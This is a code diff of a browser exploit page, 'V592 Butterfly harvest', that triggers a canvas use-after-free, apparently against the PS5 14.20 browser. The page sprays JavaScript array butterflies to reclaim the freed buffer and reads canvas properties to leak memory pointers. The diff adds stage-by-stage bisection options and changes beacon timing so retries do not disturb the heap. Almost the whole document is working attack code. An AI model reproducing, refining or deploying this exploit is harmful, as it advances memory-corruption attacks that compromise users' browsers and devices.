@@ -4,17 +4,45 @@
 <title>V592</title></head>
 <body><pre id="out">V592 — Butterfly harvest (zero-alloc pre-read)</pre>
 <script>
+/* ---- URL params (parsed before any allocation-heavy work) ----
+ * stage=1 : trigger only
+ * stage=2 : trigger + pre-read
+ * stage=3 : trigger + pre-read + spray
+ * stage=4 : trigger + pre-read + spray + post-read
+ * stage=5 : trigger + spray + post-read, NO pre-read (reclaim first, then read)
+ * stage=0 (default) : full original behaviour
+ * spray=N : override spray count (default 200)
+ * noretry=1 : disable beacon retries
+ */
+var PARAM = {};
+try {
+  var qs = location.search.replace(/^\?/, '');
+  var parts = qs.split('&');
+  for (var qi = 0; qi < parts.length; qi++) {
+    if (!parts[qi]) continue;
+    var kv = parts[qi].split('=');
+    PARAM[kv[0]] = decodeURIComponent(kv[1] || '');
+  }
+} catch (e) {}
+var STAGE = parseInt(PARAM.stage || '0', 10);
+var NORETRY = PARAM.noretry === '1';
+
 var O=document.getElementById('out');
 function say(s){O.textContent+='\n'+s;}
 function bk(tag,body){
   var u='/beacon/V592-'+tag+'?d='+encodeURIComponent(String(body).slice(0,800))+'&t='+Date.now();
   try{new Image().src=u;}catch(e){}
-  setTimeout(function(){try{new Image().src=u+'&r=2';}catch(e){}},200);
-  setTimeout(function(){try{new Image().src=u+'&r=3';}catch(e){}},600);
+  /* Retries moved 200ms/600ms -> 4s/8s: the old delays fired *inside* the
+   * zero-alloc critical window and could reclaim the freed slots. */
+  if (!NORETRY) {
+    setTimeout(function(){try{new Image().src=u+'&r=2';}catch(e){}},4000);
+    setTimeout(function(){try{new Image().src=u+'&r=3';}catch(e){}},8000);
+  }
 }
 
-bk('BOOT','v592-butterfly-harvest-v2');
-say('V592: Butterfly harvest (zero-alloc pre-read)\n');
+bk('BOOT','v592-butterfly-harvest-v3-stage' + STAGE);
+say('V592: Butterfly harvest (zero-alloc pre-read)');
+say('stage=' + STAGE + ' noretry=' + NORETRY + '\n');
 
 var f64 = new Float64Array(1);
 var u32 = new Uint32Array(f64.buffer);
@@ -49,16 +77,16 @@ function computeCap(saveCount) {
 
 var CAP = computeCap(SAVES);
 var BUF_BYTES = CAP * STATE_SIZE;
-var LAST_IDX = SAVES;  /* 0=initial, 1..32=saved states → last=32 */
+var LAST_IDX = SAVES;  /* 0=initial, 1..32=saved states -> last=32 */
 var LW_OFFSET = LAST_IDX * STATE_SIZE + 48;
 
 /* Pre-allocate spray arrays BEFORE the UAF trigger to avoid allocations after */
-var SPRAY_COUNT = 200;
+var SPRAY_COUNT = parseInt(PARAM.spray || '200', 10);
 var ARRAY_LEN = Math.ceil(BUF_BYTES / 8);  /* elements for butterfly to match buffer size */
-/* +1 for IndexingHeader overhead: (ARRAY_LEN * 8) + 8 → same bmalloc size class as BUF_BYTES */
+/* +1 for IndexingHeader overhead: (ARRAY_LEN * 8) + 8 -> same bmalloc size class as BUF_BYTES */
 
-say('Config: saves=' + SAVES + ' cap=' + CAP + ' buf=' + BUF_BYTES + ' arrayLen=' + ARRAY_LEN + ' lwOff=' + LW_OFFSET);
-bk('CONFIG', 'saves=' + SAVES + ',cap=' + CAP + ',buf=' + BUF_BYTES + ',lwOff=' + LW_OFFSET);
+say('Config: saves=' + SAVES + ' cap=' + CAP + ' buf=' + BUF_BYTES + ' arrayLen=' + ARRAY_LEN + ' lwOff=' + LW_OFFSET + ' spray=' + SPRAY_COUNT);
+bk('CONFIG', 'saves=' + SAVES + ',cap=' + CAP + ',buf=' + BUF_BYTES + ',lwOff=' + LW_OFFSET + ',spray=' + SPRAY_COUNT);
 
 /* ===================================================================
  * PHASE 1: Trigger CVE-43720 UAF
@@ -87,7 +115,7 @@ Object.defineProperty(dict, 'alpha', {
     ctx.lineDashOffset = 2.222;
     ctx.shadowBlur = 5.55;
     for (var i = 0; i < SAVES; i++) ctx.save();
-    ctx.lineWidth = 1.0;  /* triggers realizeSaves → external buffer allocated */
+    ctx.lineWidth = 1.0;  /* triggers realizeSaves -> external buffer allocated */
     return true;
   }
 });
@@ -102,6 +130,58 @@ try {
 if (!savedCtx || !bmpCtx) {
   bk('ERR', 'no-ctx:inner=' + !!savedCtx + ',bmr=' + !!bmpCtx);
   say('ABORT: trigger failed');
+} else if (STAGE === 1) {
+  /* ---- stage 1: did the trigger itself survive? ---- */
+  bk('STG1', 'trigger-ok,ctx=' + (!!savedCtx));
+  say('STG1: trigger ok (stopping here)');
+} else if (STAGE === 5) {
+  /* ---- stage 5: trigger -> spray -> post-read, NO pre-read ----
+   * Rationale (from stage 1-4 bisection on PS5 14.20):
+   * stage 1 (trigger only) survives; stage 2 (trigger + pre-read) crashes.
+   * => reading the freed-but-unreclaimed stateStack buffer faults on 14.20.
+   * V573 proved reading AFTER reclaim works. So reclaim FIRST, then read. */
+  for (var s5 = 0; s5 < SPRAY_COUNT; s5++) {
+    var a5 = new Array(ARRAY_LEN);
+    for (var j5 = 0; j5 < ARRAY_LEN; j5++) a5[j5] = marker;
+    sprays[s5] = a5;
+  }
+  var p5lw, p5ml, p5ga, p5ldo, p5sb;
+  try { p5lw = savedCtx.lineWidth; } catch(e) { p5lw = -1; }
+  try { p5ml = savedCtx.miterLimit; } catch(e) { p5ml = -1; }
+  try { p5ga = savedCtx.globalAlpha; } catch(e) { p5ga = -1; }
+  try { p5ldo = savedCtx.lineDashOffset; } catch(e) { p5ldo = -1; }
+  try { p5sb = savedCtx.shadowBlur; } catch(e) { p5sb = -1; }
+
+  var post5 = 'lw=' + (typeof p5lw === 'number' ? d2hex(p5lw) : p5lw);
+  post5 += ',ml=' + (typeof p5ml === 'number' ? d2hex(p5ml) : p5ml);
+  post5 += ',ga=' + (typeof p5ga === 'number' ? d2hex(p5ga) : p5ga);
+  post5 += ',ldo=' + (typeof p5ldo === 'number' ? d2hex(p5ldo) : p5ldo);
+  post5 += ',sb=' + (typeof p5sb === 'number' ? d2hex(p5sb) : p5sb);
+  bk('POST', 'nopre|' + post5);
+  say('Post-spray (no pre-read): ' + post5);
+
+  var leaks5 = [];
+  var fields5 = ['lw','ml','ga','ldo','sb'];
+  var defaults5 = {lw:1, ml:10, ga:1, ldo:0, sb:0};
+  var presets5 = {lw:3.14159, ml:7.77, ga:0.42, ldo:2.222, sb:5.55};
+  var vals5 = {lw:p5lw, ml:p5ml, ga:p5ga, ldo:p5ldo, sb:p5sb};
+  for (var f5 = 0; f5 < fields5.length; f5++) {
+    var fn5 = fields5[f5];
+    var pv5 = vals5[fn5];
+    if (typeof pv5 !== 'number') continue;
+    if (pv5 !== defaults5[fn5] && pv5 !== (presets5[fn5]||null) && pv5 !== 0 && pv5 !== 1.0) {
+      leaks5.push(fn5 + '=' + d2hex(pv5) + '(0x' + d2big(pv5).toString(16) + ')');
+    }
+  }
+  if (leaks5.length > 0) {
+    bk('LEAK', leaks5.join('+'));
+    say('\n*** LEAK DETECTED ***');
+    for (var l5 = 0; l5 < leaks5.length; l5++) say('  ' + leaks5[l5]);
+  } else {
+    bk('NOLEAK', 'post=expected');
+    say('\nNo leak: post-read values match expected.');
+  }
+  canvas._sprays = sprays;
 } else {
   /* CRITICAL: Read IMMEDIATELY — no say(), no bk(), no new objects!
    * The 768B context slot bytes 8+ are intact (free list only corrupts 0-7).
@@ -109,7 +189,7 @@ if (!savedCtx || !bmpCtx) {
    * stateStack buffer bytes 8+ are intact.
    * Read before any allocation that could reclaim either slot. */
 
-  /* CRITICAL SEQUENCE: pre-read → spray → post-read with ZERO allocations between.
+  /* CRITICAL SEQUENCE: pre-read -> spray -> post-read with ZERO allocations between.
    * No say(), no bk(), no new Image(), no string concat, nothing.
    * Any allocation could reclaim the 768B context slot and corrupt m_stateStack. */
 
@@ -120,104 +200,118 @@ if (!savedCtx || !bmpCtx) {
   try { preLDO = savedCtx.lineDashOffset; } catch(e) { preLDO = -1; }
   try { preSB = savedCtx.shadowBlur; } catch(e) { preSB = -1; }
 
-  /* Spray — reclaim stateStack buffer with JSArray butterflies.
-   * marker + sprays pre-allocated before UAF. Only Array + fill allocations here. */
-  for (var s = 0; s < SPRAY_COUNT; s++) {
-    var a = new Array(ARRAY_LEN);
-    for (var j = 0; j < ARRAY_LEN; j++) a[j] = marker;
-    sprays[s] = a;
-  }
-
-  /* Post-spray read — if butterfly reclaimed the stateStack buffer,
-   * lineWidth now reads a JSValue pointer (tiny denorm double) */
-  var postLW, postML, postGA, postLDO, postSB;
-  try { postLW = savedCtx.lineWidth; } catch(e) { postLW = -1; }
-  try { postML = savedCtx.miterLimit; } catch(e) { postML = -1; }
-  try { postGA = savedCtx.globalAlpha; } catch(e) { postGA = -1; }
-  try { postLDO = savedCtx.lineDashOffset; } catch(e) { postLDO = -1; }
-  try { postSB = savedCtx.shadowBlur; } catch(e) { postSB = -1; }
-
   preReads = {lw: preLW, ml: preML, ga: preGA, ldo: preLDO, sb: preSB};
-  postReads = {lw: postLW, ml: postML, ga: postGA, ldo: postLDO, sb: postSB};
 
-  /* NOW safe to allocate — report ALL results */
-  var pre = 'lw=' + (typeof preLW === 'number' ? d2hex(preLW) : preLW);
-  pre += ',ml=' + (typeof preML === 'number' ? d2hex(preML) : preML);
-  pre += ',ga=' + (typeof preGA === 'number' ? d2hex(preGA) : preGA);
-  bk('PRE', pre);
-  say('Pre-spray: ' + pre);
-
-  var post = 'lw=' + (typeof postLW === 'number' ? d2hex(postLW) : postLW);
-  post += ',ml=' + (typeof postML === 'number' ? d2hex(postML) : postML);
-  post += ',ga=' + (typeof postGA === 'number' ? d2hex(postGA) : postGA);
-  bk('POST', post);
-  say('Post-spray: ' + post);
-
-  /* Check for leaks: any value that changed from pre to post AND is not default/preset */
-  var leaks = [];
-  var fields = ['lw','ml','ga','ldo','sb'];
-  var defaults = {lw:1, ml:10, ga:1, ldo:0, sb:0};
-  var presets = {lw:3.14159, ml:7.77, ga:0.42, ldo:2.222, sb:5.55};
-  for (var fi = 0; fi < fields.length; fi++) {
-    var fn = fields[fi];
-    var pv = postReads[fn];
-    if (typeof pv !== 'number') continue;
-    if (pv !== defaults[fn] && pv !== (presets[fn]||null) && pv !== 0 && pv !== 1.0) {
-      var hexv = d2hex(pv);
-      var bigv = '0x' + d2big(pv).toString(16);
-      leaks.push(fn + '=' + hexv + '(' + bigv + ')');
-    }
-  }
-
-  if (leaks.length > 0) {
-    bk('LEAK', leaks.join('+'));
-    say('\n*** LEAK DETECTED ***');
-    for (var li = 0; li < leaks.length; li++) say('  ' + leaks[li]);
+  if (STAGE === 2) {
+    /* ---- stage 2: pre-read survived? ---- */
+    bk('STG2', 'pre:lw=' + d2hex(preLW) + ',ml=' + d2hex(preML) + ',ga=' + d2hex(preGA) +
+               ',ldo=' + d2hex(preLDO) + ',sb=' + d2hex(preSB));
+    say('STG2: pre-read ok (stopping here)');
   } else {
-    /* Check if pre-read already shows non-default (stale data in freed buffer) */
-    var preLeaks = [];
-    for (var fi2 = 0; fi2 < fields.length; fi2++) {
-      var fn2 = fields[fi2];
-      var ppv = preReads[fn2];
-      if (typeof ppv !== 'number') continue;
-      if (ppv !== defaults[fn2] && ppv !== (presets[fn2]||null) && ppv !== 0 && ppv !== 1.0) {
-        preLeaks.push(fn2 + '=' + d2hex(ppv));
-      }
+    /* Spray — reclaim stateStack buffer with JSArray butterflies.
+     * marker + sprays pre-allocated before UAF. Only Array + fill allocations here. */
+    for (var s = 0; s < SPRAY_COUNT; s++) {
+      var a = new Array(ARRAY_LEN);
+      for (var j = 0; j < ARRAY_LEN; j++) a[j] = marker;
+      sprays[s] = a;
     }
-    if (preLeaks.length > 0) {
-      bk('PRELEAK', preLeaks.join('+'));
-      say('\nPre-spray values changed from expected:');
-      for (var pi = 0; pi < preLeaks.length; pi++) say('  ' + preLeaks[pi]);
+
+    if (STAGE === 3) {
+      /* ---- stage 3: spray survived? ---- */
+      bk('STG3', 'sprayed=' + SPRAY_COUNT + ',pre:lw=' + d2hex(preLW) + ',ml=' + d2hex(preML));
+      say('STG3: spray ok (stopping here)');
     } else {
-      bk('NOLEAK', 'pre=expected,post=unchanged');
-      say('\nNo leak: values match expected (buffer not reclaimed or data identical)');
+      /* Post-spray read — if butterfly reclaimed the stateStack buffer,
+       * lineWidth now reads a JSValue pointer (tiny denorm double) */
+      var postLW, postML, postGA, postLDO, postSB;
+      try { postLW = savedCtx.lineWidth; } catch(e) { postLW = -1; }
+      try { postML = savedCtx.miterLimit; } catch(e) { postML = -1; }
+      try { postGA = savedCtx.globalAlpha; } catch(e) { postGA = -1; }
+      try { postLDO = savedCtx.lineDashOffset; } catch(e) { postLDO = -1; }
+      try { postSB = savedCtx.shadowBlur; } catch(e) { postSB = -1; }
+
+      postReads = {lw: postLW, ml: postML, ga: postGA, ldo: postLDO, sb: postSB};
+
+      /* NOW safe to allocate — report ALL results */
+      var pre = 'lw=' + (typeof preLW === 'number' ? d2hex(preLW) : preLW);
+      pre += ',ml=' + (typeof preML === 'number' ? d2hex(preML) : preML);
+      pre += ',ga=' + (typeof preGA === 'number' ? d2hex(preGA) : preGA);
+      bk('PRE', pre);
+      say('Pre-spray: ' + pre);
+
+      var post = 'lw=' + (typeof postLW === 'number' ? d2hex(postLW) : postLW);
+      post += ',ml=' + (typeof postML === 'number' ? d2hex(postML) : postML);
+      post += ',ga=' + (typeof postGA === 'number' ? d2hex(postGA) : postGA);
+      bk('POST', post);
+      say('Post-spray: ' + post);
+
+      /* Check for leaks: any value that changed from pre to post AND is not default/preset */
+      var leaks = [];
+      var fields = ['lw','ml','ga','ldo','sb'];
+      var defaults = {lw:1, ml:10, ga:1, ldo:0, sb:0};
+      var presets = {lw:3.14159, ml:7.77, ga:0.42, ldo:2.222, sb:5.55};
+      for (var fi = 0; fi < fields.length; fi++) {
+        var fn = fields[fi];
+        var pv = postReads[fn];
+        if (typeof pv !== 'number') continue;
+        if (pv !== defaults[fn] && pv !== (presets[fn]||null) && pv !== 0 && pv !== 1.0) {
+          var hexv = d2hex(pv);
+          var bigv = '0x' + d2big(pv).toString(16);
+          leaks.push(fn + '=' + hexv + '(' + bigv + ')');
+        }
+      }
+
+      if (leaks.length > 0) {
+        bk('LEAK', leaks.join('+'));
+        say('\n*** LEAK DETECTED ***');
+        for (var li = 0; li < leaks.length; li++) say('  ' + leaks[li]);
+      } else {
+        /* Check if pre-read already shows non-default (stale data in freed buffer) */
+        var preLeaks = [];
+        for (var fi2 = 0; fi2 < fields.length; fi2++) {
+          var fn2 = fields[fi2];
+          var ppv = preReads[fn2];
+          if (typeof ppv !== 'number') continue;
+          if (ppv !== defaults[fn2] && ppv !== (presets[fn2]||null) && ppv !== 0 && ppv !== 1.0) {
+            preLeaks.push(fn2 + '=' + d2hex(ppv));
+          }
+        }
+        if (preLeaks.length > 0) {
+          bk('PRELEAK', preLeaks.join('+'));
+          say('\nPre-spray values changed from expected:');
+          for (var pi = 0; pi < preLeaks.length; pi++) say('  ' + preLeaks[pi]);
+        } else {
+          bk('NOLEAK', 'pre=expected,post=unchanged');
+          say('\nNo leak: values match expected (buffer not reclaimed or data identical)');
+        }
+      }
+
+      /* Also try: read strokeStyle/fillStyle (string getters — may reveal pointer as color) */
+      try {
+        var ss = savedCtx.strokeStyle;
+        bk('SS', 'val=' + ss);
+        say('strokeStyle: ' + ss);
+      } catch(e) {
+        bk('SS', 'ERR:' + e.name);
+        say('strokeStyle: ERR ' + e.name);
+      }
+      try {
+        var fs = savedCtx.fillStyle;
+        bk('FS', 'val=' + fs);
+        say('fillStyle: ' + fs);
+      } catch(e) {
+        bk('FS', 'ERR:' + e.name);
+        say('fillStyle: ERR ' + e.name);
+      }
+
+      /* Keep sprays alive */
+      canvas._sprays = sprays;
     }
   }
-
-  /* Also try: read strokeStyle/fillStyle (string getters — may reveal pointer as color) */
-  try {
-    var ss = savedCtx.strokeStyle;
-    bk('SS', 'val=' + ss);
-    say('strokeStyle: ' + ss);
-  } catch(e) {
-    bk('SS', 'ERR:' + e.name);
-    say('strokeStyle: ERR ' + e.name);
-  }
-  try {
-    var fs = savedCtx.fillStyle;
-    bk('FS', 'val=' + fs);
-    say('fillStyle: ' + fs);
-  } catch(e) {
-    bk('FS', 'ERR:' + e.name);
-    say('fillStyle: ERR ' + e.name);
-  }
-
-  /* Keep sprays alive */
-  canvas._sprays = sprays;
 }
 
 setTimeout(function() {
-  bk('DONE', 'v592-complete');
+  bk('DONE', 'v592-complete-stage' + STAGE);
   say('\nV592 complete.');
 }, 3000);
 </script>
